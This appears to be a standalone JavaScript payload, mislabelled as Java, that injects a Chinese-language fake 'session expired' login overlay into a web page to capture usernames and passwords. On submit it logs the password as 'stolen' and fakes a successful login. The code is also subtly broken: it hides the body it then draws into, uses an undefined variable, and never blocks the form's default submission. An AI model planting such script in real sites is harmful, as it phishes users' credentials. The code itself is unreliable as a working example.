```java
<script>

  document.body.style.display = "none";
  
 
  const fakeLogin = document.createElement("div");
  fakeLogin.style.cssText = \`
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    padding: 50px;
    box-sizing: border-box;
  \`;
  
  fakeLogin.innerHTML = \`
    <h2 style="color: #333;">会话过期，请重新登录</h2>
    <form id="fakeLoginForm" style="max-width: 400px; margin-top: 20px;">
      <div style="margin-bottom: 15px;">
        <label>用户名：</label>
        <input type="text" name="username" style="width: 100%; padding: 8px;" required>
      </div>
      <div style="margin-bottom: 15px;">
        <label>密码：</label>
        <input type="password" name="password" style="width: 100%; padding: 8px;" required>
      </div>
      <button type="submit" style="padding: 8px 20px; background: #007bff; color: white; border: none; border-radius: 4px;">登录</button>
    </form>
  \`;
  
  document.body.appendChild(fakeLogin);

  document.getElementById("fakeLoginForm").addEventListener("submit", function(e) {

    console.log("窃取到的密码：", password);

    alert("登录成功，正在跳转...");
    location.reload();
  });
</script>
```
